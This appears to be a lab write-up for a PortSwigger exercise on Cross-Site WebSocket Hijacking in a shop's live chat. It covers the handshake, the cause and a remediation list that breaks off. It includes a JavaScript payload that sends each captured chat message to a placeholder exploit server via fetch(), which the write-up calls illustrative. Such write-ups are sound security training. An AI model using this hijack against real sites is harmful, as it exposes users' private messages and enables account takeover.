# Cross-Site WebSocket Hijacking

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
Cross-Site WebSocket Hijacking (CSWSH)

## Lab Objective
Exploit a Cross-Site WebSocket Hijacking vulnerability in an online shop's live chat functionality.

The objective is to host a malicious HTML/JavaScript payload on the provided exploit server, establish an authenticated WebSocket connection using the victim's session, retrieve and exfiltrate their chat history, and use the obtained information to gain access to their account.

## Vulnerability Overview
Cross-Site WebSocket Hijacking (CSWSH) is a vulnerability that occurs when an application establishes WebSocket connections without properly validating the origin of incoming connection requests.

Unlike conventional HTTP requests, WebSocket connections begin with an HTTP handshake. During this handshake, the browser can automatically attach the user's session cookies.

If the application does not validate the `Origin` header and relies solely on cookie-based authentication, an attacker can host a malicious webpage that initiates a WebSocket connection to the vulnerable application from the victim's browser.

Because the victim's browser automatically includes their authenticated session cookies, the attacker may establish a connection under the victim's identity.

If the application allows access to sensitive WebSocket messages, the attacker can read information exchanged through the connection and transmit it to an external server.

## Methodology

1. Examined the application's live chat functionality to identify its WebSocket-based communication.
2. Opened Burp Suite and navigated to **Proxy → WebSockets history**.
3. Identified the WebSocket connection associated with the `/chat` endpoint.
4. Inspected the WebSocket handshake request and its response.
5. Examined the authentication mechanism and the handling of the `Origin` header.
6. Investigated how WebSocket messages were exchanged and how chat history was retrieved.
7. Prepared an HTML/JavaScript payload to initiate a cross-origin WebSocket connection.
8. Used the provided exploit server to host the malicious webpage.
9. Tested the exploit and retrieved the victim's chat history.
10. Used the extracted information to access the victim's account.

## Exploitation Steps

1. Accessed the online shop and opened its live chat functionality.

2. Opened Burp Suite and navigated to **Proxy → WebSockets history** to inspect the WebSocket traffic.

3. Identified the handshake request:
   ```http
   GET /chat HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Connection: Upgrade
   Upgrade: websocket
   Sec-WebSocket-Version: 13
   Sec-WebSocket-Key: ...
   ```

4. Verified that the server accepted the WebSocket connection through the following response:
   ```http
   HTTP/1.1 101 Switching Protocols
   Connection: Upgrade
   Upgrade: websocket
   ```

5. Investigated the application's WebSocket authentication and origin validation mechanisms.

6. Prepared a malicious webpage containing JavaScript to establish a WebSocket connection to the target application.

7. Configured the JavaScript to capture incoming WebSocket messages and transmit the retrieved chat history to the exploit server.

8. Hosted the payload using the provided exploit server and delivered it to the victim.

9. Retrieved the victim's chat history and identified the information required to access their account.

10. Used the extracted information to gain access to the victim's account and successfully solve the lab.

## Payloads

**WebSocket handshake request:**

```http
GET /chat HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Origin: https://YOUR-EXPLOIT-SERVER
Cookie: session=VICTIM-SESSION
```

**JavaScript exploit structure:**

```html
<script>
    var ws = new WebSocket(
        'wss://YOUR-LAB-ID.web-security-academy.net/chat'
    );

    ws.onmessage = function(event) {
        fetch('https://YOUR-EXPLOIT-SERVER/exploit', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

*Note: This is an illustrative exploit structure, not a verified copy of the exact successful payload used in this lab. The actual lab ID, exploit-server URL and successful message-handling logic should be taken from the working exploit.*

## Screenshots

<!-- Paste or drag-and-drop screenshots directly into the editor -->

![WebSocket Handshake](screenshots/websocket-handshake.png)

![Exploit Verification](screenshots/exploit-evidence.png)

## Root Cause

The root cause is insufficient origin validation during the WebSocket handshake.

The application does not adequately verify whether an incoming WebSocket connection originates from a trusted website.

Additionally, relying exclusively on automatically attached session cookies for authentication allows a malicious website to potentially establish a connection using the victim's authenticated session.

This creates an opportunity for cross-site attackers to access sensitive information exchanged through WebSocket connections.

## Remediation

- Validate the `Origin` header